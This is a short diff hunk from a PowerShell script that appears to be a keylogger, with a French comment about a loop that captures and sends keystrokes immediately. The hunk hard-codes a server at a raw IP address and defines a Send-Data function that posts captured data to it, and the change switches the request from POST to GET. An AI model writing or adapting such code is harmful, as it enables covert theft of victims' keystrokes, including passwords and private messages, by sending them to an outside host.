@@ -4,7 +4,7 @@ $serverUrl = "http://20.121.45.132:8080"
 function Send-Data {
     param ([string]$data)
     $body = @{ "data" = $data }
-    Invoke-WebRequest -Uri $serverUrl -Method POST -Body $body
+    Invoke-WebRequest -Uri $serverUrl -Method GET -Body $body
 }
 
 # Boucle pour capturer et envoyer les frappes immédiatement
